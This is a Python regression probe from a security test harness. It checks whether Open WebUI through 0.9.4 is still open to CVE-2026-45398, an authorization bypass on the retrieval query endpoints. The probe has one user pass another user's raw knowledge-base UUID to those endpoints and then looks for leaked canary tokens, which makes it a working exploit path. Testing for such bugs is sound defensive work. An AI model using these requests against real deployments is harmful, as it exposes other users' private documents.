"""
Behavioral Regression Probe for CVE-2026-45398.
Target: Open WebUI <= 0.9.4 (Fixed in 0.9.5)
Bug Class: Role or Function-Level Authorization Bypass (Prefix/UUID Bypass)
Channel: direct_api

Mechanism:
The access-check helper strictly validated 'user-memory-*' and 'file-*' prefixes,
allowing knowledge-base raw UUIDs to pass through unchecked into retrieval query
endpoints (POST /api/v1/retrieval/query/collection and POST /api/v1/retrieval/query/doc).

Coverage Scope Notice:
This probe specifically covers the retrieval read-side raw UUID authorization bypass
(reading document vectors from an unauthorized knowledge base via query_collection/query_doc).
It does NOT cover the write-side injection routes (/process/text, /process/file,
/process/files/batch) that are also documented in upstream advisory GHSA-4g37-7p2c-38r9.
"""

from typing import List, Optional
from adapters.base import TargetAdapter, UserSession
from core.engine import CanaryToken, ProbingEngine, ProbeResult, LeakSeverity

CVE_ID = "CVE-2026-45398"
CHANNEL = "direct_api"
BUG_CLASS = "role_or_function_authorization"
PRECONDITION = None


def run(
    adapter: TargetAdapter,
    base_url: str,
    alice: UserSession,
    bob: UserSession,
    planted_canaries: List[CanaryToken],
    engine: ProbingEngine,
    dry_run: bool = False,
) -> ProbeResult:
    """Execute behavioral regression probe for CVE-2026-45398."""
    alice_kb_ids = alice.metadata.get("knowledge_ids", []) if isinstance(alice.metadata, dict) else []
    target_uuid = None
    if isinstance(alice_kb_ids, list) and alice_kb_ids:
        candidate = alice_kb_ids[0]
        if isinstance(candidate, str) and candidate.strip():
            target_uuid = candidate.strip()

    if not target_uuid:
        return ProbeResult(
            probe_id="cve45398",
            probe_prompt="Raw UUID retrieval bypass against private collection (CVE-2026-45398)",
            probe_category=f"cve_regression:{CVE_ID}",
            target_response="INCONCLUSIVE: Missing required target knowledge base UUID in victim (Alice) metadata.",
            retrieved_contexts=[],
            leaked_canaries=[],
            severity=LeakSeverity.NONE,
            channel=CHANNEL,
            inconclusive=True,
        )

    prompt_label = f"Raw UUID retrieval bypass against private collection '{target_uuid}' (CVE-2026-45398)"

    if dry_run:
        return engine.evaluate_response(
            prompt=prompt_label,
            response_text="Direct query access denied (403 Forbidden).",
            retrieved_contexts=[],
            planted_canaries=planted_canaries,
            probe_category=f"cve_regression:{CVE_ID}",
            channel=CHANNEL,
        )

    # 1. Primary collection retrieval query: POST /api/v1/retrieval/query/collection
    coll_text, coll_ctx, coll_resp = adapter.query_collection(
        base_url,
        bob,
        collection_names=[target_uuid],
        query="anything",
        k=10,
        hybrid=False,
    )

    # 2. Document retrieval query: POST /api/v1/retrieval/query/doc
    doc_text, doc_ctx, doc_resp = adapter.query_doc(
        base_url,
        bob,
        collection_name=target_uuid,
        query="anything",
        k=10,
    )

    all_contexts = list(coll_ctx) + list(doc_ctx)
    composite_resp = {
        "collection_endpoint": coll_resp,
        "doc_endpoint": doc_resp,
    }

    return engine.evaluate_response(
        prompt=prompt_label,
        response_text=coll_text or doc_text,
        retrieved_contexts=all_contexts,
        planted_canaries=planted_canaries,
        raw_response=composite_resp,
        probe_category=f"cve_regression:{CVE_ID}",
        channel=CHANNEL,
    )

